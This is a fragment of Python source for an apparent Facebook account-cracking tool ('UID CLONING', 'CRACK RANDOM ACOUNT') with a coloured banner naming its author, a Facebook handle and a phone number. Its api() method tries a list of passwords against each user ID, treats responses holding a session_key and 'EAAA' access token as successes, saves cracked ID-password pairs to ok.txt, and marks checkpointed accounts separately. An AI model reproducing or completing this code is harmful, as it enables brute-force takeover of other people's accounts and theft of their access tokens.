...
class Main:
	def __init__(self):
		...
		print("    \033[0;97m ########  ########     ###\n     ##     ## ##     ##   ## ##\n     \033[0;91m##     ## ##     ##  ##   ##\n     \033[0;91m########  ########  ##     ##\n     \033[0;97m##     ## ##     ## #########\n     \033[0;97m##     ## ##     ## ##     ##\n     \033[0;97m########  ########  ##     ##")
		print("    \033[0;92m-------------------------------")
		print("    \033[0;92mAuthur   :  Rafsan") 
		print("    \033[0;92mfacebok  :  facebook/md.rafsan.02") 
		print("    \033[0;92mWhtsap   :  +8801300338413") 
		print("    \033[0;92m-------------------------------")
		print("\n    \033[0;92m            UID CLONING \033[0;97m ")
		print("\n    \033[0;92m[A]\033[0;97m CRACK RANDOM ACOUNT \033[0;97m ")
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;91m   [BBA_OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [BBA_CP] %s | %s\033[0;97m         "%(uid, pw))
